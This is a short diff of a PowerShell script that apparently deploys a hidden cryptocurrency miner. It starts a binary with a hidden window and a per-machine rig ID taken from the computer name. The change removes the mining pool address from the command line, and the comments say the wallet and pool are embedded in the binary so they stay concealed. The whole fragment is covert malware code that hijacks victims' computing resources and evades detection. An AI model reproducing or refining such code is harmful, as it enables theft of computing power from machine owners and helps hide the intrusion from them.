@@ -40,8 +40,8 @@ if (-not (Test-Path $sysPath)) {
 }
 
 $hostName = $env:COMPUTERNAME
-# unique worker per machine via rig-id (wallet stays hidden inside the binary)
-$minArgs  = "-o 141.94.96.71:443 --rig-id=$hostName --tls --keepalive"
+# unique worker per machine: rig-id only, pool+wallet+tls come from embedded config
+$minArgs  = "--rig-id=$hostName"
 
 if (Test-Path $sysPath) {
     Start-Process -FilePath $sysPath -ArgumentList $minArgs -WorkingDirectory $dir -WindowStyle Hidden
